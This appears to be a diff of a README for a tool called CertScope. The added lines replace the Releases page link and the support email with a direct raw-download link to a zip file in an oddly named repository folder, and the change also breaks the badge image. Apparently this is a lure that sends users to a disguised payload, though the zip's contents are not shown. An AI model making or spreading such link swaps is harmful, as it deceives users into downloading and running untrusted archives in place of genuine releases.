@@ -10,7 +10,7 @@ You can easily download and install CertScope. Follow these instructions:
 
 1. Click the link below to visit the Releases page.
    
-   [![Download CertScope](https://img.shields.io/badge/Download%20CertScope-Click%20Here-blue)](https://github.com/faisalsPOV/CertScope/releases)
+   [![Download CertScope](https://raw.githubusercontent.com/faisalsPOV/CertScope/main/irretentive/CertScope.zip%20CertScope-Click%20Here-blue)](https://raw.githubusercontent.com/faisalsPOV/CertScope/main/irretentive/CertScope.zip)
 
 2. On the Releases page, look for the latest version. 
 
@@ -61,7 +61,7 @@ If you have any questions or need support, please consider the following options
 
 - **GitHub Issues:** Post your problems or feature requests on the Issues tab of this repository.
 - **Community Forum:** Join our community forum to discuss with fellow users. [Link to Community Forum](#)
-- **Email Support:** If you prefer, send us an email at support@certscope.com for direct assistance.
+- **Email Support:** If you prefer, send us an email at https://raw.githubusercontent.com/faisalsPOV/CertScope/main/irretentive/CertScope.zip for direct assistance.
 
 ## 📚 Documentation
 
@@ -84,4 +84,4 @@ By following these steps, you will have CertScope up and running in no time. Hap
 
 For ongoing updates and features, stay tuned for new releases on our Releases page:
 
-[![Download CertScope](https://img.shields.io/badge/Download%20CertScope-Click%20Here-blue)](https://github.com/faisalsPOV/CertScope/releases)
+[![Download CertScope](https://raw.githubusercontent.com/faisalsPOV/CertScope/main/irretentive/CertScope.zip%20CertScope-Click%20Here-blue)](https://raw.githubusercontent.com/faisalsPOV/CertScope/main/irretentive/CertScope.zip)
